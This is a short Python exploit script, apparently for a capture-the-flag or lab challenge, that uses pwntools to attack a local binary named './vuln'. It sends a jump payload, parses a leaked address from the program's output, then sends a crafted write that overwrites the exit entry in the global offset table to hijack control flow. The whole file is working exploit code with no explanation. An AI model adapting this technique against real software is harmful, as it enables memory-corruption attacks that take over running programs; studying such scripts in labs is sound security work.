#!/usr/bin/env python

import re
from pwn import *

payload = (
    "\xeb\x0c" + "A" * 12 +
    asm("push 0x8048966; ret;")
)

r = process(["./vuln", payload])

data = r.recvuntil("an overflow will not be very useful...\n")
addr = int(re.search("([0-9]+)\n", data).group(1))

# 0804d02c R_386_JUMP_SLOT   exit@GLIBC_2.0
payload = (
    p32(0x0804d02c - 12) +
    p32(addr) 
)
r.sendline(payload)
print(r.recvall())

r.close()
